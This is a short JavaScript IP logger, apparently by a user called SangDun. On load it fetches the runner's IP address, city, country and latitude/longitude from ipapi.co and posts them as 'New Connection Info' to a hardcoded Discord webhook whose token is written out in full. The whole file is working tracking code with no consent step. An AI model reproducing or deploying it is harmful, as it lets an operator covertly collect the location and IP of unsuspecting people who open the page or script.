// IP Location + Discord Webhook Sender
// By SangDun

const ipAPI = "https://ipapi.co/json/";
const webhookURL = "https://discord.com/api/webhooks/1369448197772148848/J_9O_lVF7fQd3NhHxtB2h5CH0MieE7VwHWiJ0-jaOglGqAqUh-QCmvbVFJGGrO5M8qH0";

// Fetch IP and location info from ipapi.co
async function getIPInfo() {
    try {
        const response = await fetch(ipAPI);
        const data = await response.json();

        return {
            ip: data.ip,
            city: data.city,
            region: data.region, // optional
            country: data.country_name,
            latitude: data.latitude,
            longitude: data.longitude
        };
    } catch (error) {
        console.error("❌ Error fetching IP info:", error);
        return null;
    }
}

// Send collected info to Discord webhook
async function sendToDiscord(info) {
    if (!info) {
        console.error("❌ IP info is null or undefined.");
        return;
    }

    const payload = {
        content: `📡 **New Connection Info**
> 🖥️ IP Address: \`${info.ip}\`
> 🌍 Country: **${info.country}**
> 🏙️ City: **${info.city}**
> 📍 Coordinates: **${info.latitude}, ${info.longitude}**`
    };

    try {
        const response = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log("✅ IP info sent to Discord successfully!");
        } else {
            console.error("❌ Error sending to Discord:", response.statusText);
        }
    } catch (error) {
        console.error("❌ Error:", error);
    }
}

// Main runner function
async function main() {
    const info = await getIPInfo();
    if (info) {
        await sendToDiscord(info);
    }
}

main();
